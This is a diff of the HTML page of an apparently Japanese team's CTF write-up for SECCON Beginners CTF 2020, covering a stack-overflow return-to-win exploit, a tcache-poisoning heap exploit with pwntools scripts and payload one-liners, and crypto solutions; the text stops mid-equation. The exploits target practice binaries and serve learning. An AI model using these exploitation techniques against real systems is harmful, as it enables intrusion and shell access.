@@ -1,139 +1,6 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-<meta name="HandheldFriendly" content="True" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-<meta name="generator" content="Hugo 0.131.0">
-
-
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="theme-color" content="#ffffff">
-
-
-<title>SECCON Beginners CTF 2020 Write-up - urandom</title>
-
-
-<meta name="author" content="mayth" />
-
-
-<meta name="description" content="CTF team made up of graduates from University of Tsukuba, Japan" />
-
-
-<meta name="keywords" content="CTF, Write-ups, SECCON" />
-
-
-<meta property="og:title" content="SECCON Beginners CTF 2020 Write-up" />
-<meta name="twitter:title" content="SECCON Beginners CTF 2020 Write-up" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://urandom.team/post/seccon-beginners-ctf-2020/" /><meta property="og:description" content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー" />
-<meta name="twitter:description" content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー" /><meta property="og:image" content="https://urandom.team/images/og.png" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://urandom.team/images/og.png" /><meta property="article:published_time" content="2020-05-24T23:27:00+09:00" /><meta property="article:modified_time" content="2020-05-24T23:27:00+09:00" />
-
-
-<style>
-    @media (prefers-color-scheme: dark) {
-        body[data-theme='auto'] img {
-            filter: brightness(60%);
-        }
-    }
-
-    body[data-theme='dark'] img {
-        filter: brightness(60%);
-    }
-</style>
-
-
-
-
-<link rel="stylesheet" href="https://urandom.team/assets/css/fuji.min.css" />
-
-
-
-
-
-
-
-
-</head>
-
-<body
-  data-theme="auto"
-  data-theme-auto='true'
-  >
-    <script data-cfasync="false">
-  
-  var fujiThemeData = localStorage.getItem('fuji_data-theme');
-  
-  if (!fujiThemeData) {
-    localStorage.setItem('fuji_data-theme', 'auto');
-  } else {
-    
-    if (fujiThemeData !== 'auto') {
-      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
-    }
-  }
-</script>
-
-    <header>
-    <div class="container-lg clearfix">
-        <div class="col-12 header">
-            <a class="title-main" href="https://urandom.team/">urandom</a>
-            
-        </div>
-    </div>
-</header>
-
-    <main>
-        <div class="container-lg clearfix">
-            
-            <div class="col-12 col-md-9 float-left content">
-                
-<article>
-    
-    <h2 class="post-item post-title">
-        <a href="https://urandom.team/post/seccon-beginners-ctf-2020/">SECCON Beginners CTF 2020 Write-up</a>
-    </h2>
-    <div class="post-item post-meta">
-        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-24</span>
-
-
-
-<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/ctf">CTF</a>&nbsp;<a href="/tags/write-ups">Write-ups</a>&nbsp;<a href="/tags/seccon">SECCON</a>&nbsp;</span>
-
-    </div>
-    
-    <div class="post-content markdown-body">
-        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-<p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html" target="_blank">SECCON Beginners CTF 2020</a>のwrite-upです。</p>
-<p>なお、今回は以下のメンバー編成で参加しました。</p>
-<ul>
-<li>yuscarlet</li>
-<li>mayth</li>
-<li>yyu</li>
-<li>favcastle</li>
-</ul>
-<h2 id="pwn">Pwn</h2>
-<h3 id="beginners-stack">Beginner&rsquo;s Stack</h3>
-<blockquote>
-<p>Let&rsquo;s learn how to abuse stack overflow!</p>
-</blockquote>
-<p>64bit ELFのバイナリが与えられる。これがサーバーで動いている。</p>
-<p>実行すると</p>
-<blockquote>
-<pre><code>Your goal is to call `win` function (located at 0x400861)
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=x-ua-compatible content="IE=edge"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=generator content="Hugo 0.119.0"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>SECCON Beginners CTF 2020 Write-up - urandom</title><meta name=author content="mayth"><meta name=description content="CTF team made up of graduates from University of Tsukuba, Japan"><meta name=keywords content="CTF,Write-ups,SECCON"><meta property="og:title" content="SECCON Beginners CTF 2020 Write-up"><meta name=twitter:title content="SECCON Beginners CTF 2020 Write-up"><meta property="og:type" content="article"><meta property="og:url" content="https://urandom.team/post/seccon-beginners-ctf-2020/"><meta property="og:description" content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー"><meta name=twitter:description content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー"><meta property="og:image" content="https://urandom.team/images/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://urandom.team/images/og.png"><meta property="article:published_time" content="2020-05-24T23:27:00+09:00"><meta property="article:modified_time" content="2020-05-24T23:27:00+09:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://urandom.team/assets/css/fuji.min.css></head><body data-theme=auto data-theme-auto=true><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header><div class="container-lg clearfix"><div class="col-12 header"><a class=title-main href=https://urandom.team>urandom</a></div></div></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h2 class="post-item post-title"><a href=https://urandom.team/post/seccon-beginners-ctf-2020/>SECCON Beginners CTF 2020 Write-up</a></h2><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-24</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/ctf>CTF</a>&nbsp;<a href=/tags/write-ups>Write-ups</a>&nbsp;<a href=/tags/seccon>SECCON</a>&nbsp;</span></div><div class="post-content markdown-body"><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href=https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html target=_blank>SECCON Beginners CTF 2020</a>のwrite-upです。</p><p>なお、今回は以下のメンバー編成で参加しました。</p><ul><li>yuscarlet</li><li>mayth</li><li>yyu</li><li>favcastle</li></ul><h2 id=pwn>Pwn</h2><h3 id=beginners-stack>Beginner&rsquo;s Stack</h3><blockquote><p>Let&rsquo;s learn how to abuse stack overflow!</p></blockquote><p>64bit ELFのバイナリが与えられる。これがサーバーで動いている。</p><p>実行すると</p><blockquote><pre><code>Your goal is to call `win` function (located at 0x400861)
 
    [ Address ]           [ Stack ]
                    +--------------------+
@@ -157,29 +24,15 @@
                    +--------------------+
 0x00007ffeb1443b08 | 0x00007ffeb1443be8 |
                    +--------------------+
-</code></pre>
-</blockquote>
-<p>といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の<code>win</code>関数では、<code>system(&quot;/bin/sh&quot;)</code>を呼び出してくれる。つまり<code>win</code>関数を呼べれば自動的にシェルが取れる。</p>
-<p>さて、IDAで実行ファイルを見てみると、<code>vuln</code>という関数で入力を受け付けて<code>buf</code>に格納していることがわかる。このとき、<code>buf</code>は<code>0x20</code>(32)byteしかない一方で、<code>read</code>関数を呼ぶときに入力サイズを<code>0x200</code>に設定していて、ここでスタックオーバーフローが発生する。これを使って&quot;return address (vuln)&ldquo;となっている箇所を書き換えればよい。飛び先となる<code>win</code>関数のアドレスは分かっているし、&ldquo;return address&quot;までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。</p>
-<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x61\x08\x40&quot;' | ./chall
-</code></pre>
-<p>これは失敗する。</p>
-<blockquote>
-<pre><code>Oops! RSP is misaligned!
+</code></pre></blockquote><p>といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の<code>win</code>関数では、<code>system("/bin/sh")</code>を呼び出してくれる。つまり<code>win</code>関数を呼べれば自動的にシェルが取れる。</p><p>さて、IDAで実行ファイルを見てみると、<code>vuln</code>という関数で入力を受け付けて<code>buf</code>に格納していることがわかる。このとき、<code>buf</code>は<code>0x20</code>(32)byteしかない一方で、<code>read</code>関数を呼ぶときに入力サイズを<code>0x200</code>に設定していて、ここでスタックオーバーフローが発生する。これを使って"return address (vuln)&ldquo;となっている箇所を書き換えればよい。飛び先となる<code>win</code>関数のアドレスは分かっているし、&ldquo;return address"までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。</p><pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x61\x08\x40&quot;' | ./chall
+</code></pre><p>これは失敗する。</p><blockquote><pre><code>Oops! RSP is misaligned!
 Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
 This instruction fails when RSP is not a multiple of 0x10.
 Find a way to align RSP! You're almost there!
-</code></pre>
-</blockquote>
-<p>というわけで、<code>rsp</code>（スタックポインタ）が<code>0x10</code>の倍数になっていないといけない。スタックポインタは8byteずつ動くので、<code>push</code>/<code>pop</code>が呼び出される回数を1回増やすか減らすかする。</p>
-<p><code>win</code>関数があるという<code>0x400861</code>だが、これは関数の先頭、すなわち<code>push rbp</code>を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。<code>push rbp</code>の直後の<code>0x400862</code>を書き込むようにする。</p>
-<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x62\x08\x40&quot;' | ./chall
+</code></pre></blockquote><p>というわけで、<code>rsp</code>（スタックポインタ）が<code>0x10</code>の倍数になっていないといけない。スタックポインタは8byteずつ動くので、<code>push</code>/<code>pop</code>が呼び出される回数を1回増やすか減らすかする。</p><p><code>win</code>関数があるという<code>0x400861</code>だが、これは関数の先頭、すなわち<code>push rbp</code>を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。<code>push rbp</code>の直後の<code>0x400862</code>を書き込むようにする。</p><pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x62\x08\x40&quot;' | ./chall
 ...
 Congratulations!
-</code></pre>
-<p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
-<p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p>
-<pre><code class="language-python">from pwn import *
+</code></pre><p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system("/bin/sh")</code>は呼べているがttyが取れなくて死んでいるようだった。</p><p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p><pre><code class=language-python>from pwn import *
 
 context.arch = 'amd64'
 
@@ -188,13 +41,7 @@ io = process('chall')
 vuln_ret = pack(0x400862)
 io.sendline(b'A' * 40 + vuln_ret)
 io.interactive()
-</code></pre>
-<p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
-<h3 id="beginners-heap">Beginner&rsquo;s Heap</h3>
-<p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207" target="_blank">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
-<p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p>
-<blockquote>
-<pre><code>Let's learn heap overflow today
+</code></pre><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p><h3 id=beginners-heap>Beginner&rsquo;s Heap</h3><p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href=https://furutsuki.hatenablog.com/entry/2019/02/26/112207 target=_blank>t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p><p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p><blockquote><pre><code>Let's learn heap overflow today
 You have a chunk which is vulnerable to Heap Overflow (chunk A)
 
  A = malloc(0x18);
@@ -213,21 +60,11 @@ Call &lt;win&gt; function and you'll get the flag.
 4. Describe heap
 5. Describe tcache (for size 0x20)
 6. Currently available hint
-</code></pre>
-</blockquote>
-<p>この対話環境を操作し、ヒープオーバーフローを使って<code>win</code>関数を呼び出すのが目標となる。なお、<code>__free_hook</code>と<code>win</code>関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では<code>__free_hook</code>だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。</p>
-<p><code>A</code>は<code>0x18</code>byteしかない一方で、1の操作で<code>0x80</code>byteまで書くことができる。<code>B</code>にはオーバーフローの脆弱性はないが、2の操作で<code>malloc</code>して書き込み、3の操作で<code>free</code>ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。</p>
-<p>何はともあれヒントを見てみる。</p>
-<blockquote>
-<pre><code>Tcache manages freed chunks in linked lists by size.
+</code></pre></blockquote><p>この対話環境を操作し、ヒープオーバーフローを使って<code>win</code>関数を呼び出すのが目標となる。なお、<code>__free_hook</code>と<code>win</code>関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では<code>__free_hook</code>だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。</p><p><code>A</code>は<code>0x18</code>byteしかない一方で、1の操作で<code>0x80</code>byteまで書くことができる。<code>B</code>にはオーバーフローの脆弱性はないが、2の操作で<code>malloc</code>して書き込み、3の操作で<code>free</code>ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。</p><p>何はともあれヒントを見てみる。</p><blockquote><pre><code>Tcache manages freed chunks in linked lists by size.
 Every list can keep up to 7 chunks.
 A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
 Let's check what happens when you overwrite fd by Heap Overflow.
-</code></pre>
-</blockquote>
-<p>まず2でBを<code>malloc</code>して適当な値を書き込み、3で<code>free</code>する。この時点で4/5を実行すると次のような状態であることがわかる。</p>
-<blockquote>
-<pre><code>-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
+</code></pre></blockquote><p>まず2でBを<code>malloc</code>して適当な値を書き込み、3で<code>free</code>する。この時点で4/5を実行すると次のような状態であることがわかる。</p><blockquote><pre><code>-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
  [+] A = 0x558bbf3eb330
  [+] B = (nil)
                    +--------------------+
@@ -252,10 +89,7 @@ Let's check what happens when you overwrite fd by Heap Overflow.
 0x0000558bbf3eb368 | 0x0000000000020ca1 |
                    +--------------------+
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-</code></pre>
-</blockquote>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+</code></pre></blockquote><blockquote><pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
 [    tcache (for 0x20)    ]
         ||
         \/
@@ -264,20 +98,11 @@ Let's check what happens when you overwrite fd by Heap Overflow.
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre>
-</blockquote>
-<p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
-この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p>
-<pre><code class="language-python">p.sendline(b'X' * 0x20 + p64(free_hook_addr))
-</code></pre>
-<p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
+</code></pre></blockquote><p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
+この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p><pre><code class=language-python>p.sendline(b'X' * 0x20 + p64(free_hook_addr))
+</code></pre><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p><blockquote><pre><code>It seems __free_hook is successfully linked to tcache!
 But the chunk size is broken or too big maybe...?
-</code></pre>
-</blockquote>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+</code></pre></blockquote><blockquote><pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
 [    tcache (for 0x20)    ]
         ||
         \/
@@ -289,45 +114,22 @@ But the chunk size is broken or too big maybe...?
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre>
-</blockquote>
-<p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p>
-<pre><code class="language-python">p.sendlineafter(&quot;&gt; &quot;, '1')
+</code></pre></blockquote><p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p><pre><code class=language-python>p.sendlineafter(&quot;&gt; &quot;, '1')
 p.sendline(b'X' * 0x18 + p64(0x20) + p64(free_hook_addr))
-</code></pre>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
+</code></pre><blockquote><pre><code>It seems __free_hook is successfully linked to tcache!
 But you can't get __free_hook since you can only malloc/free B.
 What if you change the chunk size to a value other than 0x20...?
-</code></pre>
-</blockquote>
-<p>あまりに大きすぎると先ほどのように壊れていると言われるので、<code>0x30</code>にすると次の段階になった。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
+</code></pre></blockquote><p>あまりに大きすぎると先ほどのように壊れていると言われるので、<code>0x30</code>にすると次の段階になった。</p><blockquote><pre><code>It seems __free_hook is successfully linked to tcache!
 And the chunk size is properly forged!
-</code></pre>
-</blockquote>
-<p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p>
-<pre><code class="language-python">p.sendlineafter(&quot;&gt; &quot;, '2')
+</code></pre></blockquote><p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p><pre><code class=language-python>p.sendlineafter(&quot;&gt; &quot;, '2')
 p.sendline(b'X' * 0x10)
-</code></pre>
-<p>この段階でのヒントはこんな感じ。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
+</code></pre><p>この段階でのヒントはこんな感じ。</p><blockquote><pre><code>It seems __free_hook is successfully linked to tcache!
 The first link of tcache is __free_hook!
 But B is not empty...
-</code></pre>
-</blockquote>
-<p><code>B</code>を<code>free</code>して空にしてみる。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
+</code></pre></blockquote><p><code>B</code>を<code>free</code>して空にしてみる。</p><blockquote><pre><code>It seems __free_hook is successfully linked to tcache!
 The first link of tcache is __free_hook!
 Also B is empty! You know what to do, right?
-</code></pre>
-</blockquote>
-<p>ここでtcacheの状態を見てみると、<code>B</code>を<code>free</code>したのにここに追加されておらず、<code>__free_hook</code>のアドレスだけが残っていることがわかる。</p>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+</code></pre></blockquote><p>ここでtcacheの状態を見てみると、<code>B</code>を<code>free</code>したのにここに追加されておらず、<code>__free_hook</code>のアドレスだけが残っていることがわかる。</p><blockquote><pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
 [    tcache (for 0x20)    ]
         ||
         \/
@@ -336,32 +138,14 @@ Also B is empty! You know what to do, right?
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre>
-</blockquote>
-<p>最初のヒントには以下の記載があった。</p>
-<blockquote>
-<pre><code>Tcache manages freed chunks in linked lists by size.
-</code></pre>
-</blockquote>
-<p>また、冒頭に挙げた記事にも次の記載がある。</p>
-<blockquote>
-<p>定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, &hellip;, 0x408バイト以下というように区切られています。</p>
-</blockquote>
-<p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p>
-<p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p>
-<pre><code class="language-python">p.sendlineafter('&gt; ', '2')
+</code></pre></blockquote><p>最初のヒントには以下の記載があった。</p><blockquote><pre><code>Tcache manages freed chunks in linked lists by size.
+</code></pre></blockquote><p>また、冒頭に挙げた記事にも次の記載がある。</p><blockquote><p>定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, &mldr;, 0x408バイト以下というように区切られています。</p></blockquote><p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p><p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p><pre><code class=language-python>p.sendlineafter('&gt; ', '2')
 p.sendline(pack(win_addr))
 
 p.sendlineafter('&gt; ', '3')
 
 log.info(p.recvline_contains(&quot;ctf4b&quot;))
-</code></pre>
-<h2 id="crypto">Crypto</h2>
-<h3 id="rb">R&amp;B</h3>
-<p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p>
-<h3 id="noisy-equations">Noisy equations</h3>
-<p>下記のPythonプログラムが動いている。</p>
-<pre><code class="language-python">from os import getenv
+</code></pre><h2 id=crypto>Crypto</h2><h3 id=rb>R&amp;B</h3><p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p><h3 id=noisy-equations>Noisy equations</h3><p>下記のPythonプログラムが動いている。</p><pre><code class=language-python>from os import getenv
 from time import time
 from random import getrandbits, seed
 
@@ -385,37 +169,33 @@ answers = [dot(coeff, FLAG) + getrandbits(L) for coeff in coeffs]
 
 print(coeffs)
 print(answers)
-</code></pre>
-<p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
+</code></pre><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
 <code>answers</code>が表示されているが、これには乱数<code>getrandbits(L)</code>が加算されているので、
 2回分のデータを使っていくという方法がある。
 いま1回目の結果得られた<code>coeffs</code>を\(C_1\)、そして2回目を\(C_2\)とすると、
-これらは次のような行列である。</p>
-<p>$$
+これらは次のような行列である。</p><p>$$
 \begin{align*}
-C_1 &amp;= \left[
+C_1 &= \left[
 \begin{array}{cccc}
-c^1_{1,1} &amp; c^1_{1,2} &amp; \dots &amp; c^1_{1,44} \\\
-\vdots &amp; \ddots &amp;  &amp; \vdots \\\
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
-c^1_{44,1} &amp; c^1_{44,2} &amp; \dots &amp; c^1{44,44}
+c^1_{1,1} & c^1_{1,2} & \dots & c^1_{1,44} \\\
+\vdots & \ddots & & \vdots \\\
+\vdots & & \ddots & \vdots \\\
+c^1_{44,1} & c^1_{44,2} & \dots & c^1{44,44}
 \end{array}
 \right] \\\
 \\\
-C_2 &amp;= \left[
+C_2 &= \left[
 \begin{array}{cccc}
-c^2_{1,1} &amp; c^2_{1,2} &amp; \dots &amp; c^2_{1,44} \\\
-\vdots &amp; \ddots &amp;  &amp; \vdots \\\
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
-c^2_{44,1} &amp; c^2_{44,2} &amp; \dots &amp; c^2_{44,44}
+c^2_{1,1} & c^2_{1,2} & \dots & c^2_{1,44} \\\
+\vdots & \ddots & & \vdots \\\
+\vdots & & \ddots & \vdots \\\
+c^2_{44,1} & c^2_{44,2} & \dots & c^2_{44,44}
 \end{array}
 \right]
 \end{align*}
-$$</p>
-<p>そして<code>answer</code>は1回目を\(A_1\)、そして2回目を\(A_2\)とすると次のようになる。</p>
-<p>$$
+$$</p><p>そして<code>answer</code>は1回目を\(A_1\)、そして2回目を\(A_2\)とすると次のようになる。</p><p>$$
 \begin{align*}
-A_1 &amp;= \left[
+A_1 &= \left[
 \begin{array}{c}
 a^1_{1} \\\
 \vdots \\\
@@ -423,7 +203,7 @@ a^1_{44}
 \end{array}
 \right] \\\
 \\\
-A_2 &amp;= \left[
+A_2 &= \left[
 \begin{array}{c}
 a^2_{1} \\\
 \vdots \\\
@@ -431,20 +211,14 @@ a^2_{44}
 \end{array}
 \right]
 \end{align*}
-$$</p>
-<p>ここで\(a^1_{i} - a^2_{i}\)について考える。求めたい<code>FLAG</code>の1文字目から\(x_1, \dots, x_{44}\)とすると、</p>
-<p>$$
+$$</p><p>ここで\(a^1_{i} - a^2_{i}\)について考える。求めたい<code>FLAG</code>の1文字目から\(x_1, \dots, x_{44}\)とすると、</p><p>$$
 a^1_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) + R_i
-$$</p>
-<p>であり、この\(R_i\)は<code>getrandbits(L)</code>だがPythonプログラムを見ると、シードを固定しているため、
+$$</p><p>であり、この\(R_i\)は<code>getrandbits(L)</code>だがPythonプログラムを見ると、シードを固定しているため、
 どんな値なのかよく分からないが毎回同じ結果になる。
-したがって、\(a^1_{i} - a^2_{i}\)は次のように\(R_i\)がキャンセルされる。</p>
-<p>$$
+したがって、\(a^1_{i} - a^2_{i}\)は次のように\(R_i\)がキャンセルされる。</p><p>$$
 a^1_{i} - a^2_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) -
 \left(\sum^{44}_{j=1}{C^2_{i,j} \times x_j}\right)
-$$</p>
-<p>したがってこれを行列表現すると</p>
-<p>$$
+$$</p><p>したがってこれを行列表現すると</p><p>$$
 \left[
 \begin{array}{c}
 a^1_{1} - a^2_{1} \\\
@@ -453,10 +227,10 @@ a^1_{44} - a^2_{44}
 \end{array}
 \right] = \left[
